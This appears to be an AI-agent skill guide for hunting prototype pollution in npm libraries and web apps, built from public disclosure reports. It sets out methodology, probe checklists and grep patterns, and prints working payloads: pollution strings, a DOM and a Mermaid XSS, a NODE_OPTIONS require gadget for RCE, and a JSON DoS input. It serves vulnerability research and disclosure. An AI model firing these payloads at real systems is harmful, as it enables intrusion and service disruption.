---
name: hunt-prototype-pollution
description: Hunting skill for prototype pollution (PP) and its downstream gadgets, built from 53 full public disclosed reports. Covers the npm utility-library ecosystem (lodash merge/mergeWith/defaultsDeep/set/setWith/zipObjectDeep, jQuery $.extend, merge.recursive, Hoek.merge/applyToDefaults, deep-extend, mixin-deep, defaults-deep, merge-deep, assign-deep, deap, extend, just-extend, node.extend, utils-extend, extend-merge, plain-object-merge, lutils-merge, upmerge, dot-prop, nested-property, object-path-set, property-expr, mpath, i18next, json8-merge-patch, klona, cached-path-relative, json-bigint, typeorm, fastify-multipart, chart.js, console.table, noble) and real-world exploitation gadgets: stored/DOM XSS (Swiftype deparam location.hash #998398, GitLab Mermaid directives #1106238/#1280002), SQLi (typeorm #869574, CVSS 9.9), DoS via __proto__ assignment (json-bigint #916430), NODE_OPTIONS child-process RCE (#878181), Node permission bypass via process.mainModule.__proto__.require (#1877919), and AWS Amplify CLI VTL prototype-chain traversal to RCE (#3897236). Use when hunting PP on any Node.js/JavaScript target — pollution alone is not the finding; a reachable gadget is.
sources: github, hackerone_public, npm_advisories, snyk_research
report_count: 55
full_reports_read: 53
---

## Crown Jewel Targets

Prototype pollution is highest-value when the target is a JavaScript/Node.js application that (a) accepts structured input (JSON bodies, query/fragment key-value pairs, config objects, translation bundles, template directives) and (b) somewhere feeds that input into a "deep merge", "deep clone", "deep set", "path setter", cache-keyed map, or config-merging routine — and then (c) **later reads a property that your pollution controls** (a "gadget"). Pollution without a gadget is a low-severity MAID/DoS finding; pollution with a gadget is auth bypass, stored XSS, SQL injection, or RCE. Priority targets:

- **Node.js/Express/Nest/Fastify APIs accepting nested JSON** — the canonical sink class. 48 of 53 reports are npm third-party modules; `_.merge`, `_.set`, `defaultsDeep`, `deep-extend`, `extend`, `merge.recursive` all recur.
- **Applications using path-based setters/getters** — `dot-prop`, `nested-property`, `object-path-set`, `property-expr`, `mpath` (MongoDB-style path notation). Here the *key string itself* is the injection vector: `constructor.prototype.isAdmin`, `__proto__.b`.
- **Client-side SPAs that parse `location.hash` / query strings into objects** — Swiftype's `deparam` (#998398) turned `#__proto__[asd]=alert(document.domain)` into DOM XSS because a script gadget lived in the same JS bundle.
- **Template/rendering engines fed user content** — Mermaid `%%{init: {...}}%%` directives (#1106238, #1280002), Handlebars templates processed before child-process spawns (#878181), VTL resolver templates in AWS Amplify CLI (#3897236).
- **i18n / translation management surfaces** — `i18next.addResourceBundle` + `deepExtend` accepts `{constructor:{prototype:{polluted:true}}}` (#968355).
- **Charting / visualization libraries** — chart.js (#776371) pollution via `data`/`options` objects parsed from JSON → XSS for some applications.
- **Anything that spawns child processes** — `({}).__proto__.NODE_OPTIONS = '--require=./malicious-code.js'` reflects into child-process environments (#878181).
- **Config/feature-flag/permission engines** — dozens of payloads set `isAdmin: true` on `Object.prototype`; any `if (user.isAdmin)` check becomes bypassable.
- **Security-tooling and CLI tools with policy files** — Node's own `--experimental-policy` permission system was bypassed via `process.mainModule.__proto__.require()` (#1877919).

### Why These Are Crown Jewels (gadget tiers)

The study pack shows the same primitive scored from CVSS 1.8 to 9.9. What changes is the gadget, not the pollution:

| Tier | What the gadget reads | Result | Grounding report |
|---|---|---|---|
| 1 — MAID / memory only | nothing downstream | "property exists on all objects" | #310443, #719856, #878332 |
| 2 — DoS / resource | numeric/array properties consumed by math/stringify | hang or crash | #916430 (~70-byte input), #804772 (multipart), #712065 ("server unable to respond to all requests is guaranteed") |
| 3 — Stored / DOM XSS | `template`, `themeCSS`, `fontFamily`, `srcdoc` | script execution in victims' browsers | #998398, #1106238, #1280002, #776371 |
| 4 — Auth bypass | `isAdmin`, `role`, `permissions` | privilege escalation | payload used across #380873, #381185, #430291, #801522, #980649 |
| 5 — SQLi / RCE | query-builder options, `NODE_OPTIONS`, VTL `baseRef[id]` | data compromise / code execution | #869574 (CVSS 9.9), #878181, #3897236 |

Payouts are highest when pollution reaches **RCE** via a child-process/template gadget, **SQL injection** via a query-builder gadget, or **stored XSS** on a high-traffic host. The two GitLab Mermaid reports each paid **$3,000**; typeorm PP→SQLi scored **CVSS 9.9 Critical**; several npm module reports scored Critical (CVSS 9.3–9.4) even when the demonstrated impact was DoS.

### Hunting Priority Scorecard

Use this to rank targets before investing time. A target needs both a reachable sink and a plausible gadget:

| Priority | Target property | Evidence in pack | Go / No-go |
|---|---|---|---|
| Highest | Deep-merge API + admin/auth gadget | #869574, #380873 `isAdmin` payloads | Go — aim for auth bypass/SQLi/RCE |
| Highest | Template rendering + stored user content | #1106238, #1280002, #3897236 | Go — aim for stored XSS/RCE |
| High | Child-process spawn reachable after parse | #878181 | Go — aim for `NODE_OPTIONS` RCE |
| High | `location.hash`/query parser in bundled JS | #998398 | Go — look for same-file gadget |
| Medium | JSON parser with custom `__proto__` handling | #916430 | Go if no better gadget — DoS is valid |
| Medium | High-download npm utility with unguarded merge | #712065 (25M), #864701 (27M), #801522 | Go — ecosystem-wide impact |
| Low | Pollution with no downstream consumer | #310443, #878332 | Report as MAID/DoS only |

Note that "no gadget yet" is not the same as "no gadget": #869574's researcher initially had only DoS before identifying the SQL-injection side effect. Spend time on step 6 (gadget search) before downgrading severity.

---

## Attack Surface Signals

### Input Shapes to Hunt

```
# JSON body keys that should be treated as PP probes
{"__proto__": {"<probe>": "<marker>"}}
{"constructor": {"prototype": {"<probe>": "<marker>"}}}
{"constructor": {"prototype": {"isAdmin": true}}}
{"__proto__[probe]": "<marker>"}          # lodash set/setWith literal path
{"__proto__.b": true}                      # dot-prop / nested-property path string

# Query / fragment key-value syntax (deparam-style parsers)
?__proto__[asd]=marker
#__proto__[asd]=alert(document.domain)
?__proto__.isAdmin=true
?constructor[prototype][isAdmin]=true
```

### Sink Signatures (grep these in JS/TS source and bundles)

```javascript
// deep merge / extend / clone families
_.merge(target, source)          _.mergeWith(...)       _.defaultsDeep(...)
_.set(obj, "__proto__[x]", v)    _.setWith(...)         _.zipObjectDeep([...],[...])
$.extend(true, {}, source)       merge.recursive(a,b)    Hoek.merge(a,b)
deepExtend(target, source)       extend(true, {}, src)   klona(src)
mergeDeep(target, ...sources)

// path-based setters — attacker controls the PATH STRING
dotProp.set(obj, '__proto__.b', true)
setPath({}, '__proto__.polluted', 'yes')
expr.setter('constructor.prototype.isAdmin')(obj, true)
mpath.set('__proto__.x', value, obj)
nestedProperty.set(obj, '__proto__.polluted', 'yes')

// config/translation merges
i18next.addResourceBundle('en','translations', {...}, true, true)
json8mergepatch.apply(obj, JSON.parse('{"__proto__":{"isAdmin":true}}'))
mermaid_config = deepMerge(defaultConfig, directiveJsonObject)
cache['__proto__'] = value   // cached-path-relative pattern
```

### Feature-Based Entry Points

- **"Import config", "load preset", "merge settings", "deep clone", "defaults" endpoints** — anything that merges an object into a trusted base.
- **Search / filter / sort parameter parsers** — 46 of 53 reports carry the `search-filter-sort` signal; these often build nested objects from user key strings.
- **Multipart / file-upload parsers** — fastify-multipart (busboy) #804772 crashed servers by parsing crafted multipart field names.
- **Diagnostic / logging utilities** — `console.table(obj, ['__proto__'])` pollutes `Object.prototype[0]` (#1431042).
- **BLE / IoT bridges** — noble (#390857) exposed prototype-polluting methods with parameter names strongly suggesting Bluetooth-remote control.
- **GraphQL resolvers / VTL templates** — AWS Amplify CLI (#3897236) resolved raw `baseRef[id]` allowing prototype-chain traversal to RCE.
- **JSON parsers with custom `__proto__` handling** — json-bigint (#916430) assigned to `__proto__` during parse and confused bignumber.js.
- **ORM entity/query merging** — typeorm (#869574) merged saved objects into runtime entities, enabling SQLi.
- **Chart configuration builders** — chart.js (#776371) merged `data`/`options` from JSON into chart config.

### Package Watchlist (versions and vectors from the reports)

```
lodash 4.17.10 / 4.17.15 / 4.17.x   merge, mergeWith, defaultsDeep, set, setWith, zipObjectDeep
jQuery 3.3.1                        deep $.extend only (#454365)
merge 1.2.0                         merge.recursive (#381194)
Hoek (hoek)                          Hoek.merge / applyToDefaults (#310439)
extend 3.0.1                         extend(true, {}, payload) (#381185)
just-extend 2.1.0 / 3.0.0            constructor.prototype and __proto__ (#430291)
node.extend 2.0.0                    extend(true, {}, payload) (#430831)
utils-extend 1.0.8                   extend with __proto__ (#801522)
deep-extend / mixin-deep / defaults-deep / merge-deep / assign-deep / deap   (2018 family #311333/#311236/#310514/#310708/#310707/#310446)
lutils-merge 0.2.6 / upmerge 0.1.7   recursive copy/merge (#439107/#439120)
extend-merge 1.0.5                   merge (#878339)
plain-object-merge 1.0.1             merge([{}, payload]) (#871156)
object-path-set 1.0.0                setPath('__proto__.polluted') (#878332)
property-expr 2.0.2                  setter('constructor.prototype.isAdmin') (#910206)
dot-prop 5.1.1                       set '__proto__.b' (#719856)
nested-property 1.0.4                nested set (#788883)
mpath 0.4.1                          MongoDB-like path (#390860)
i18next                              addResourceBundle / deepExtend (#968355)
json8-merge-patch 1.0.1              RFC 7396 apply (#980649)
klona <1.1.1                         deep clone (#778414)
cached-path-relative 1.0.1           cache key '__proto__' (#390847)
json-bigint 0.3.1                    parse assigns __proto__ (#916430)
fastify-multipart <1.0.5             multipart field names (#804772)
typeorm                              mergeDeep → SQLi/DoS (#869574)
chart.js                             chart data/options → XSS (#776371)
console.table (Node v16.7.0)          properties parameter (#1431042)
noble 1.9.1                          BLE method parameters (#390857)
amplify-velocity-template (fork)     raw baseRef[id] traversal → RCE (#3897236)
```

### Response / Runtime Signals

```
- An unrelated object suddenly has your marker property: {}.<probe> === "<marker>"
- Authorization checks flipping: a request with a polluted body succeeds on an admin route
- A template renders attacker CSS/HTML (Mermaid themeCSS / fontFamily / template)
- Server hang after ~70-byte JSON input (json-bigint → bignumber.js confusion, #916430)
- Global crash / "cannot read property of undefined" storms (mass PP → DoS)
- Error message reflecting a polluted key or path string

### JS Bundle / Source Review Cheat Sheet

When you only have a minified bundle or a package tarball, look for these exact shapes. They are the code patterns behind the reported sinks:

```javascript
// recursive merge shape (#869574 typeorm, #968355 i18next, #980649 json8)
function deepMerge(target, source) {
  for (const key in source) {          // <-- no guard for __proto__/constructor
    if (isObject(source[key])) {
      target[key] = target[key] || {};
      deepMerge(target[key], source[key]);
    } else {
      target[key] = source[key];       // <-- pollution lands here
    }
  }
}

// deparam shape (#998398 Swiftype): bracket-splitting of query/fragment keys
var a = o.split("="), u = b(a[0]), c = i, h = 0, p = u.split("]["), f = p.length - 1;
...
c = c[u] = h < f ? c[u] || (p[h + 1] && isNaN(p[h + 1]) ? {} : []) : s; // pollution here
```

Interpretation rules:
- If the loop does not call `hasOwnProperty` and does not skip `__proto__`/`constructor`, treat it as vulnerable until proven otherwise.
- If the parser splits attacker keys on `][` or `.` and then walks/assigns, it is a path-setter sink (#910206, #719856, #390860).
- If the library exposes a `set(path, value)` API where `path` is a string, test `constructor.prototype.x` even when `__proto__` is filtered.
- If the merged result is later used to build CSS, HTML, SQL, or environment variables, you have a gadget — prioritize it.
```

---

## Discovery Patterns From 53 Full Reports

### Where Researchers Start (ranked recon surfaces w/ "what to look for")

1. **Third-party dependency inventory (`npm ls`, lockfile, `package.json`)** — "what to look for": any library with a merge/clone/set API. 48/53 reports are npm-module disclosures; the researcher picks a popular package (lodash 25M+ weekly downloads in #712065, 27M in #864701, 28M in #841380) and audits its source.
2. **Public GitHub source review of the library itself** — "what to look for": recursive merge loops (`for (const key in source)`), `Object.assign(target, {[key]: ...})`, bracket assignment `c[u] = ...`, and missing `key === '__proto__'` / `key === 'constructor'` guards. #869574: *"The vulnerability was found after a source code review of the library on GitHub."*
3. **Minified JS bundles / CDN scripts** — "what to look for": custom `deparam`, `parseQuery`, or `location.hash` parsing functions plus a nearby "gadget" (a DOM sink reading a configurable property). #998398: the `deparam` function in `st.js` parsed `location.hash` incorrectly and a script gadget in the *same file* turned pollution into XSS.
4. **Known cross-report variants ("variant hunting")** — "what to look for": the same bug pattern across sibling packages. #869574, #380873, #381194, #381185, #430291, #430831, #454365 all explicitly cite *"This is a variant of this vulnerability: https://hackerone.com/reports/310443"*; #788883 cites #719856; #439107 and #439120 cite #438274. When one merge library falls, test every clone of it.
5. **Feature-specific config surfaces** — "what to look for": Mermaid directives `%%{init: {...}}%%`, translation JSON, theme/style objects. #1106238: *"Behind the scenes, library takes JSON_OBJECT from directive and merges it with config object."*
6. **API endpoints accepting JSON with attacker-controlled structure** — "what to look for": does a nested `__proto__` key survive parsing? #310443: *"malicious_payload would come from an endpoint which accepts JSON data."*
7. **Post-exploitation gadget search after finding PP** — "what to look for": enumerate properties that the app reads globally (`NODE_OPTIONS`, `isAdmin`, `template`, `themeCSS`, `output`, `shell`). #998398: *"Gadget found in the same js, which is very interesting gadget I found so far :xD"*.
8. **Admin/internal backoffice and CLI tooling** — "what to look for": tools that render templates or spawn subprocesses (Amplify CLI, Handlebars preprocessors). #3897236 was found by searching public code: the AWS-published fork had never backported prototype-chain guards from upstream `velocityjs`.
9. **Multipart and parser edge cases** — "what to look for": field-name handling in busboy-family parsers; #804772 was an extension of a vulnerability Eran Hammer found in Hapi.
10. **Unusual input channels** — "what to look for": Bluetooth method parameters (noble #390857), `console.table`'s second parameter (#1431042), chart.js JSON data (#776371). Low-frequency signals (1–2 reports each) still produced real findings.

### Feature-Based Discovery Signals (frequency-ranked table w/ "why it matters / what to probe")

| Signal (study-pack tag) | Reports containing signal (of 53) | Why it matters | What to probe |
|---|---|---|---|
| `prototype-pollution` | 53 | The base technique — all reports share it | Confirm inherited property on `{}` after your input |
| `dependency-confusion` | 48 | Bug lives in a shared npm dependency, so one bug = ecosystem-wide impact | Identify library versions from lockfiles; test each merge/set API |
| `search-filter-sort` | 46 | Parameter parsers build nested objects from user key strings | Send `?__proto__[x]=y`, `?constructor[prototype][x]=y` to filter/sort params |
| `dos-resource` | 43 | Most npm-library reports default to DoS/crash impact | Send tiny payloads (~70 bytes) and watch for hangs (json-bigint) |
| `js-source-review` | 20 | Researchers find PP by reading source, not black-box only | Download the bundle/package; grep for recursive assigns |
| `api-endpoint` | 16 | JSON APIs are the delivery mechanism | POST `{"__proto__":{...}}` to every JSON endpoint |
| `public-code-search` | 11 | GitHub/Grep.app finds forks missing upstream guards | Search for `mergeDeep`, `deepExtend`, `baseRef[id]` |
| `admin-internal` | 10 | High-value gadgets in admin panels / internal CLIs | Look for `isAdmin` checks, subprocess spawns |
| `stored` | 3 | Pollution persists (e.g., Mermaid in an issue) → stored XSS | Submit payload, reload as another user |
| `template-engine` | 3 | Template config merges are PP gold | Inject `%%{init:{'__proto__':{'template':...}}}%%` |
| `comment-injection` | 3 | Comments/issues are the storage vector for templates | Post Mermaid/HTML in comments |
| `server-side-rendering` | 3 | SSR merges config objects server-side | Look for jQuery `$.extend` deep usage |
| `cache-layer` | 2 | Cache key `__proto__` overwrites `Object.prototype` | Control both cache key and value (#390847) |
| `template-injection` | 2 | Direct template string injection into config merge | Mermaid directives, VTL `#set` |
| `filter-bypass` | 2 | Guards exist but are bypassable via alternate path | Try `constructor.prototype` when `__proto__` blocked |
| `image-processing` | 2 | Chart/image config objects accept JSON | chart.js `data`/`options` pollution |
| `misconfiguration` | 2 | PP exposure via permissive config (noble BLE) | Inspect exposed method parameter names |
| `command-injection` | 2 | PP feeds `NODE_OPTIONS` / VTL → RCE | Set `__proto__.NODE_OPTIONS`, look for child spawns |
| `dom-based` | 1 | location.hash parse → XSS | `#__proto__[x]=...` then look for same-file gadget |
| `reflected` | 1 | Pollution reflected into child environment | Pollute `NODE_OPTIONS`, observe child spawn |
| `nosql-mass-assignment` | 1 | mpath MongoDB-path pollution | `mpath.set('__proto__.x', ...)` |
| `parameter-pollution` | 1 | dot-prop path abuse | `__proto__.b` path strings |
| `brute-otp-reset` | 1 | dot-prop path abuse variant | Same path-string vector, auth-flow context |
| `import-feature` / `xml-parser` | 1 each | typeorm merges imported/parsed objects | `mergeDeep` on structured input |
| `redirect-handling` | 1 | json-bigint parse path | `__proto__` assignment during parse |
| `path-traversal-lfi` / `cloud-metadata` | 1 each | Node permission bypass / property-expr | `__proto__.require()` and `constructor.prototype` |
| `export-feature` | 1 | chart.js data export config | `__proto__` in dataset/options |
| `graphql` / `graphql-technique` / `internal-network` | 1 each | AWS Amplify VTL traversal | Raw `baseRef[id]` in resolver templates |

### Verbatim Discovery Clues (18 real `[#id]` quotes)

1. [#998398] "Gadget found in the same js, which is very interesting gadget I found so far :xD"
2. [#1280002] "I am continue investigating #1106238 and found additional vector for prototype pollution and stored xss."
3. [#869574] "The vulnerability was found after a source code review of the library on GitHub."
4. [#804772] "Eran Hammer found this vulnerability for Hapi, he tested Fastify as well and found it vulnerable."
5. [#998398] "deparam function which parses the `location.hash` in https://s.swiftypecdn.com/install/v2/st.js is vulnerable to prototype pollution."
6. [#1106238] "Behind the scenes, library takes JSON_OBJECT from directive and merges it with config object."
7. [#712065] "The functions merge, mergeWith, and defaultsDeep can be tricked into adding or modifying properties of the Object prototype."
8. [#310443] "malicious_payload would come from an endpoint which accepts JSON data."
9. [#910206] "The functions setter can be tricked into modifying properties of the Object prototype."
10. [#968355] "To pollute `Object` you could thus set a translation like `{ constructor: { prototype: { polluted: true } } }`."
11. [#380873] "Craft an object of form `{constructor: {prototype: {...}}}` and send it to `_.merge`."
12. [#719856] "It allows an attacker to modify the prototype of a base object which can vary in severity depending on the implementation (DoS, access to sensitive data, RCE)."
13. [#916430] "Json parsing library assigns to `__proto__`, which can be abused to confuse `bignumber.js` library, causing a DoS on various operations with the resulting number (stringification, arithmetic) via a very small input (70 bytes)."
14. [#390847] "If the attacker can control both the path and the cached value, she can deploy a prototype pollution attack and thus overwrite arbitrary properties on Object.prototype."
15. [#390860] "An attacker can specify a path that include the prototype object, and thus overwrite important properties on Object.prototype or add new ones."
16. [#878181] "prototype pollution causes polluted system environment for child processes."
17. [#3897236] "The fork never backported any prototype-chain guards from upstream. Property resolution does raw `baseRef[id]`."
18. [#454365] "Users sometimes use `$.extend` for things like cloning an object or filling in defaults in an object with some options in it. It is not at all obvious that this is an unsafe operation."

### Probe Checklist (15 concrete probes)

1. `POST /api/anything` JSON body: `{"__proto__":{"ppprobe":"YES"}}` → then check any fresh object / error echo for `ppprobe`.
2. Same body with `{"constructor":{"prototype":{"ppprobe":"YES"}}}` (bypasses naive `__proto__` string filters).
3. Query param to a filter/sort endpoint: `?__proto__[ppprobe]=YES` and `?constructor[prototype][ppprobe]=YES`.
4. URL fragment on a page with a query parser: `#__proto__[ppprobe]=YES`, escalate to `#__proto__[x]=alert(document.domain)` if a script gadget exists (#998398).
5. Path-string probe against path setters: `dotProp.set({}, '__proto__.ppprobe', true)` / `setPath({}, '__proto__.ppprobe', 'YES')`.
6. `property-expr` style: `expr.setter('constructor.prototype.isAdmin')(obj, true)` then check `{}.isAdmin`.
7. `mpath` style: `mpath.set('__proto__.ppprobe', 'YES', obj)` — MongoDB/path notation.
8. lodash literal-bracket path: `_.set({}, "__proto__[ppprobe]", "YES")` and `_.setWith(...)`.
9. Translation/config bundle: `addResourceBundle('en','translations',{constructor:{prototype:{ppprobe:'YES'}}},true,true)`.
10. JSON Merge Patch / RFC 7396: `{"__proto__":{"ppprobe":"YES"}}` into `json8mergepatch.apply`.
11. Mermaid directive in an issue/comment: `%%{init: {'__proto__': {'ppprobe': 'YES'}}}%%`.
12. Cache key probe (#390847): control both `relative('__proto__', 'YES')`-style key and value.
13. chart.js dataset/options: `JSON.parse('{"__proto__":{"ppprobe":"YES"}}')` into `data`/`options`.
14. Child-process gadget: `({}).__proto__.NODE_OPTIONS = '--require=./probe.js'` then trigger any subprocess (#878181).
15. Tiny DoS probe: `{"__proto__":1000000000000000,"c":{"__proto__":[],"length":1e200}}` to a JSON parser; watch for hang (#916430).

---

## Step-by-Step Hunting Methodology

1. **Inventory JavaScript surfaces** — spider the app, list all Node.js services, fetch `package.json`/lockfiles where exposed, and collect JS bundles. Note every dependency with a merge/clone/set/get API.
   - Public code search is a legitimate discovery path: #3897236 was found in an AWS-published fork of `velocityjs`.

2. **Identify structured-input endpoints** — JSON APIs, config importers, search/filter/sort params, translation editors, Mermaid/chart config fields, multipart upload field names, and URL-fragment parsers.
   - Prioritize endpoints whose parameters are named `config`, `options`, `data`, `filter`, `sort`, `theme`, `settings`, or `bundle`.

3. **Source-review the sink** — for each candidate library, grep for recursive assignment: `for (const key in source)`, `Object.assign(target, {[key]: value})`, `c[u] = ...`, `target[key] = ...` without guards for `__proto__`, `constructor`, `prototype`. Confirm the exact path grammar the library accepts (`__proto__`, `constructor.prototype`, dotted `constructor.prototype.x`, bracketed `__proto__[x]`).
   - #869574's `mergeDeep` shows the canonical dangerous shape: `for (const key in source) { ... Object.assign(target, {[key]: ...}); mergeDeep(target[key], value); }`.

4. **Run the 15 probes** from the checklist against each reachable endpoint. Use a unique marker value (`ppprobe-<random>`) so you can prove the property landed on `Object.prototype` and did not merely echo.

5. **Confirm pollution, not just reflection** — in a browser console or instrumented server, verify `({}).ppprobe === 'ppprobe-<random>'` or `Object.prototype.ppprobe`. A reflected key in an error message is not pollution.
   - Check `Object.prototype.hasOwnProperty('ppprobe')` — an inherited property confirms prototype pollution rather than an own property on a single object.

6. **Hunt the gadget (this is the actual finding)** — enumerate what the app reads from objects globally:
   - `isAdmin`, `isAuthenticated`, `role`, `permissions` → auth bypass
   - `template`, `themeCSS`, `fontFamily`, `srcdoc` → stored/DOM XSS (#1106238, #998398)
   - query-builder options → SQLi (#869574)
   - `NODE_OPTIONS`, `env`, `shell`, `require` → RCE (#878181, #3897236)
   - `output`, `body`, `status` → response manipulation

7. **Choose the highest-impact gadget chain** — prefer RCE > SQLi > auth bypass > stored XSS > DoS. Many reports only claim DoS, but #869574 shows a PP in `typeorm` escalating to SQL injection, and #3897236 shows template traversal to RCE.
   - #712065 states the typical floor: "Server crash or the server becoming unable to respond to all request is garanteed, but more significant impact like remote code execution can be achieved in some cases."

8. **Test filter/sort and search parameters specifically** — 46/53 reports carry this signal. Send nested key strings, not just JSON bodies. Test both bracket and dot notation.

9. **Variant-sweep the ecosystem** — once one package is confirmed vulnerable, test sibling packages (the 2018 `merge`/`extend`/`deep-extend` family) and forks missing upstream guards (#3897236 is a `velocityjs` fork that never backported guards). #804772 shows the same approach across frameworks (Hapi → Fastify).

10. **Check persistence** — re-open the page as another user/session to see if the pollution persists (stored XSS in Mermaid issues as in #1106238/#1280002) or is request-scoped.

11. **Document the full chain** — record the polluted key, the exact input vector, the gadget that consumed it, and the resulting impact with screenshots. If you only have pollution + DoS, say so honestly; severity follows the gadget.

12. **Preserve version and provenance evidence** — record the exact library name/version (e.g., "lodash 4.17.15", "json8-merge-patch v1.0.1", "just-extend 2.1.0 and 3.0.0"). The reports are version-specific, and maintainers need the version to verify and patch. #778414 fixed in v1.1.1; #804772 fixed in v1.0.5.

13. **Check upstream advisories and sibling reports** — most reports explicitly link a prior report or advisory (#380873 → #310443 → #310443's parent #309391; #788883 → #719856; #878181 → npm advisory 1164). Citing the related report strengthens the finding and reveals the expected patch shape.

14. **Re-test after the fix is deployed** — confirm that the specific payload no longer lands on `Object.prototype` and that the gadget is neutralized. Keep the original PoC in the report so a regression is detectable.

---

## Payload & Detection Patterns

### Canonical Pollution Payloads (verbatim from reports)

```javascript
// __proto__ JSON key — lodash merge / mergeWith / defaultsDeep (#310443, #712065, #864701)
var malicious_payload = '{"__proto__":{"oops":"It works !"}}';
_.merge({}, JSON.parse(malicious_payload));
console.log({}.oops); // It works !

// constructor.prototype form — bypasses naive __proto__ filters (#380873, #381185, #430291)
var payload = JSON.parse('{"constructor": {"prototype": {"isAdmin": true}}}');
_.merge({}, payload);
console.log({}.isAdmin); // true

// bracketed literal path into lodash set / setWith (#864701)
lod.setWith({}, "__proto__[test]", "123");
lod.set({}, "__proto__[test2]", "456");
console.log(test, test2); // on Object.prototype

// zipObjectDeep crafted object (#712065)
_.zipObjectDeep(['__proto__.z'], [123]); // z === 123

// path-string setter - dot-prop (#719856) / nested-property (#788883)
dotProp.set(object, '__proto__.b', true);            // {}.b === true
setPath({}, '__proto__.polluted', 'yes');            // {}.polluted === 'yes'

// property-expr (#910206)
expr.setter('constructor.prototype.isAdmin')(obj, true); // {}.isAdmin === true

// mpath - MongoDB-like path (#390860)
mpath.set('__proto__.x', ['hilarious','fruity'], obj);    // {}.x set

// cache key POISON (#390847)
var relative = require('cached-path-relative');
relative('__proto__', 'x');
console.log({}.x); // x

// i18next deepExtend (#968355)
{ constructor: { prototype: { polluted: true } } }

// JSON Merge Patch RFC 7396 (#980649)
json8mergepatch.apply(obj, JSON.parse('{ "__proto__": { "isAdmin": true }}'));

// deep clone (#778414 klona; #454365 jQuery $.extend deep only)
extend(true, {}, JSON.parse('{"__proto__": {"isAdmin": true}}'));
$.extend(true, {}, JSON.parse('{"__proto__":{"polluted":true}}'));

// plain-object-merge (#871156) - array-of-objects signature
merge([{}, JSON.parse('{"__proto__":{"polluted":"yes"}}')]);

// Hoek.merge / applyToDefaults (#310439)
Hoek.merge({}, JSON.parse('{"__proto__":{"oops":"It works !"}}'));

// merge.recursive (#381194)
merge.recursive({}, JSON.parse('{"__proto__": {"isAdmin": true}}'));
```

### DOM / Reflected Payloads

```javascript
// Swiftype deparam + same-file script gadget (#998398)
https://blog.swiftype.com/#__proto__[asd]=alert(document.domain)

// Generic fragment/query pollution probe
?__proto__[ppprobe]=YES
?constructor[prototype][isAdmin]=true

// Mermaid directive → stored XSS (#1106238, #1280002)
%%{init: {'__proto__': {'template': '<iframe xmlns="http://www.w3.org/1999/xhtml" srcdoc="&lt;script src=...&gt;&lt;/script&gt;">'}}}%%
%%{init: { '__proto__': {'themeCSS': '...'}} }%%   // themeCSS/fontFamily flow into CSS

// chart.js dataset/options (#776371)
JSON.parse(`{"__proto__": {"abc": "Injected value through dataset"}}`)
JSON.parse(`{"__proto__": {"def": "Injected through options"}}`)
```

### RCE / Privilege Gadgets

```javascript
// Child-process environment injection (#878181)
({}).__proto__.NODE_OPTIONS = '--require=./malicious-code.js';
// any subsequent child_process.spawn executes malicious-code.js first

// Node permission-system bypass (#1877919)
const os = process.mainModule.__proto__.require("os"); // ignores --experimental-policy

// VTL prototype-chain traversal to RCE (#3897236)
// amplify-velocity-template fork resolves raw baseRef[id] with no prototype-chain guards;
// crafted VTL #set() reaches Object prototype chain → file operations (proof: /tmp/amplify-rce-proof)
```

### Tiny DoS Payload (#916430)

```javascript
const JSONbig = require('json-bigint');
const json = '{"__proto__":1000000000000000,"c":{"__proto__":[],"length":1e200}}';
const r = JSONbig.parse(json);
console.log(r.toString()); // hangs - bignumber.js confused by polluted prototype
```

### Detection / Grep Patterns

```bash
# find pollution-prone recursive merges in a codebase
grep -rE "(merge|extend|clone|defaults|assign)\s*\(" --include="*.js" --include="*.ts" src/
grep -rE "for\s*\(const\s+\w+\s+in\s+(source|obj|options)" --include="*.js" src/
grep -rE "__proto__|constructor\s*\.\s*prototype|prototype\s*\." --include="*.js" src/

# detect missing guards - the dangerous pattern is assignment with NO filter
grep -rE "\[key\]\s*=|\[u\]\s*=|\.set\(" --include="*.js" src/

# browser: confirm pollution from location.hash parsing
# in DevTools after visiting target with #__proto__[x]=y:
({}).x          // should be 'y' if polluted
Object.prototype.hasOwnProperty('x')  // false when inherited
```

### Sink → Payload → Gadget Map (quick reference)

| Library / surface | Payload form (from report) | Best demonstrated gadget |
|---|---|---|
| lodash `merge`/`mergeWith`/`defaultsDeep` | `{"__proto__":{"isAdmin":true}}` | auth bypass; DoS (#310443, #712065) |
| lodash `set`/`setWith` | `"__proto__[test]"` literal path | global property creation (#864701) |
| lodash `zipObjectDeep` | `['__proto__.z'],[123]` | global variable `z` (#712065) |
| jQuery `$.extend(true)` | `{"__proto__":{...}}` via JSON.parse | SSR config pollution (#454365) |
| `extend`/`just-extend`/`node.extend`/`utils-extend` | `{"__proto__":{"isAdmin":true}}` | auth bypass; DoS (#381185, #430291, #430831, #801522) |
| `merge.recursive`/`deep-extend`/`mixin-deep`/`defaults-deep`/`merge-deep`/`assign-deep`/`deap` | `{"__proto__":{"oops":"It works !"}}` | DoS / global property (#381194, #311333, #311236, #310514, #310708, #310707, #310446) |
| `dot-prop`/`nested-property`/`object-path-set` | `'__proto__.b'` path string | auth bypass; DoS (#719856, #788883, #878332) |
| `property-expr` | `'constructor.prototype.isAdmin'` | auth bypass (#910206) |
| `mpath` | `'__proto__.x'` | noSQL mass-assignment (#390860) |
| `i18next` | translation with `constructor.prototype` | global config pollution (#968355) |
| `json8-merge-patch` | RFC 7396 `apply` with `__proto__` | auth bypass / RCE claim (#980649) |
| `klona` | `__proto__` during deep clone | `toString` override → RCE claim (#778414) |
| `cached-path-relative` | `relative('__proto__','x')` | cache poisoning of prototype (#390847) |
| `json-bigint` | 70-byte numeric `__proto__` | hang via bignumber.js (#916430) |
| `fastify-multipart` | crafted multipart field names | remote DoS (#804772) |
| `typeorm` | saved object with `__proto__` | SQL injection (#869574) |
| Mermaid directives | `%%{init:{'__proto__':...}}%%` | stored XSS (#1106238, #1280002) |
| chart.js | `__proto__` in `data`/`options` | XSS (#776371) |
| Node `child_process` | `__proto__.NODE_OPTIONS` | RCE (#878181) |
| Node `--experimental-policy` | `mainModule.__proto__.require()` | permission bypass (#1877919) |
| AWS Amplify VTL | raw `baseRef[id]` traversal | RCE (#3897236) |

---

## Common Root Causes

1. **Recursive merge without prototype-key guards** — the dominant root cause. `mergeDeep`, `_.merge`, `$.extend(true)`, `extend`, `deep-extend` loop over source keys and assign to `target[key]` without skipping `__proto__` / `constructor` / `prototype`. This is the through-line of dozens of reports (#310443, #380873, #381185, #439107, #439120, #871156, #878339). #910206 phrases it as: "The functions setter can be tricked into modifying properties of the Object prototype."

